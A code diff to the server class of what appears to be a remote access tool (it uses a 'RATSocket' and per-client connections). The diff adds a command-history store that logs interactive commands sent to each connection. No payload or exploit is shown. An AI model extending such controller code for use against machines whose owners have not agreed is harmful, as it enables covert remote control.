@@ -12,6 +12,7 @@ from core.utils.parsing import parse
 from core.utils.formatting import print_table
 from core.utils.terminal import Colors
 from server.commands.alias_manager import AliasManager
+from server.commands.command_history import CommandHistoryStore
 from server.commands.executor import CommandExecutor
 from server.config.config import SOCKET_ADDR
 from core.utils.server_util import *
@@ -30,9 +31,12 @@ class Server:
         self.socket = RATSocket()
         self.connections = ConnectionManager()
         self.alias_manager = AliasManager()
+        self.command_history = CommandHistoryStore()
 
         # web
         self.web_service = ServerWebService(self)
+
+
 
     # ------------------ connection lookup ------------------ #
     def get_target_connection_by_client_id(self, client_id) -> ClientConnection:
@@ -281,6 +285,10 @@ class Server:
         """
         执行交互模式命令
         """
+
+        if cmd.strip() and not cmd.strip().startswith('history'):
+            self.command_history.record_for_connection(conn, cmd, source='cli')
+
         func = command_executor.process_command(cmd)
         if func:
             for item in func():
